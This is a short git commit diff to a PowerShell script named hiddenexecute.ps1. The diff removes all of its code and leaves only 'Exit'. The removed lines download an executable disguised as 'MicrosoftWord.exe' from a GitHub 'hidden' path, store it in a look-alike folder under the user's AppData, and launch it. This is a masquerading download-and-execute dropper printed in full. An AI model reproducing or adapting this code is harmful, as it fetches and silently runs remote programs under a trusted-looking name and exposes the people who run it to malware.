150581e44a2d35803e675305718a751b2948895e
webntdev <96979468+webntdev@users.noreply.github.com>
2024-04-18 14:06:07 +0300

    Update hiddenexecute.ps1

--- files/hiddenexecute.ps1
+++ files/hiddenexecute.ps1
@@ -1,11 +1,1 @@
-$url = "https://github.com/webntdev/webntdev.github.io/raw/main/hidden/MicrosoftWord.exe"
-$folderPath = "$env:USERPROFILE\AppData\Local\MicrosoftWord"
-$localPath = "$folderPath\MicrosoftWord.exe"
-
-if (-Not (Test-Path $folderPath)) {
-    New-Item -ItemType Directory -Path $folderPath
-}
-
-Invoke-WebRequest -Uri $url -OutFile $localPath
-
-Start-Process $localPath
+Exit
